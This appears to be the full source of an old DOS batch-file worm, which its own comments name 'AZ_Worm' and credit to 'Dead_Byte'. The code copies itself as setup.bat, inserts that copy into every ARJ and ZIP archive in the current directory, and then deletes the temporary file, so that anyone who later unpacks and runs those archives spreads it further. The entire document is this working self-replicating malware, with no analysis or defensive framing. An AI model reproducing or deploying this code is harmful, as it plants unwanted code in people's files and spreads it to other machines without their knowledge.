copy %0 setup.bat 
for %%a in (*.arj) do arj a -y  %%a setup.bat 
for %%z in (*.zip) do pkzip  %%z setup.bat 
del setup.bat
rem    virus "AZ_Worm"
rem      
rem                                  Dead_Byte
